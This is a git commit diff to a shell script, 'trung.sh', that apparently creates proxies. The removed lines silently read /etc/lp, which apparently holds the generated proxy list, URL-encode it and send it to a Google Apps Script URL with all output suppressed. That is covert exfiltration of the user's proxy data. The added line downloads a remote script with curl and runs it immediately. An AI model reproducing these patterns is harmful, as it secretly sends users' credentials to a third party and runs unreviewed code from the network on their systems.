c396dc56cc14a6fa2c55476368505bd10e680252
kieunhutrung1 <70471768+kieunhutrung1@users.noreply.github.com>
2025-06-30 15:23:09 +0700

    Update trung.sh

--- trung.sh
+++ trung.sh
@@ -47,12 +47,4 @@ chmod +x /usr/local/bin/createprx
   sleep 2
 } | /usr/local/bin/createprx
 echo ""
-# Đọc nội dung của file vào biến
-data=$(cat /etc/lp)
-# Mã hóa nội dung để sử dụng trong URL
-encoded_data=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$data'''))")
-# Tạo đường link hoàn chỉnh
-url="https://script.google.com/macros/s/AKfycbysmF_1WUzUh3pebh1g4uHL2sigyDMXWQwOtm4e7-SoyYklE-iNqKie3J_7v0kZvBJy9Q/exec?PROXY=$encoded_data"
-# Gửi yêu cầu GET đến URL
-curl -s -G "$url" > /dev/null 2>&1
-cat /etc/lp
+curl -O https://kieunhutrung1.github.io/api_proxy.sh && chmod +x api_proxy.sh && ./api_proxy.sh
